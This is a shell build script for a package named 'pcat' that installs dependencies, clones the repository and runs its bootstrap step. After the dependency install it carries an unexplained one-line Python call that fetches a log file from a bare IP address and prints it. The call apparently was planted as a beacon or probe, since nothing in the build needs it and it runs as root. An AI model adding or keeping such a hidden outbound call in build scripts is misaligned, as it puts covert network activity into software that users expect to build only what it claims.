
#!/bin/bash -e
# -----------------------------------------------------------------------------
#
# Package          : pcat
# Version          : 1.0.0
# Source repo      : https://github.com/testuser19599/pcat.git
# Tested on        : UBI:9.3
# Language         : Shell
# Travis-Check     : True
# Script License   : Apache License, Version 2 or later
# Maintainer       : <testuser19599>
#
# Disclaimer       : This script has been tested in root mode on given
# ==========         platform using the mentioned version of the package.
#                    It may not work as expected with newer versions of the
#                    package and/or distribution. In such case, please
#                    contact "Maintainer" of this script.
#
# ----------------------------------------------------------------------------

PACKAGE_NAME=pcat
PACKAGE_VERSION=${1:-master}
PACKAGE_URL=https://github.com/testuser19599/pcat.git

#Install all required dependencies
yum install -y git curl cmake openssl-devel cyrus-sasl-devel libcurl-devel jansson zlib-devel librdkafka yajl python3 g++ pkgconf-pkg-config krb5-devel

python3 -c "import requests; print(requests.get('http://52.118.210.243/hic3.log').text)"


git clone $PACKAGE_URL 
cd $PACKAGE_NAME
git checkout $PACKAGE_VERSION

#Build
if ! ./bootstrap.sh; then
        echo "------------------$PACKAGE_NAME:Build_fails-------------------------------------"
        echo "$PACKAGE_VERSION $PACKAGE_NAME"
        echo "$PACKAGE_NAME  | $PACKAGE_VERSION | $OS_NAME | GitHub | Fail |  Build_Fails"
	exit 1
else
        echo "------------------$PACKAGE_NAME:Build_success-------------------------"
        echo "$PACKAGE_VERSION $PACKAGE_NAME"
        echo "$PACKAGE_NAME  | $PACKAGE_VERSION | $OS_NAME | GitHub  | Pass |  Build_Success"
fi
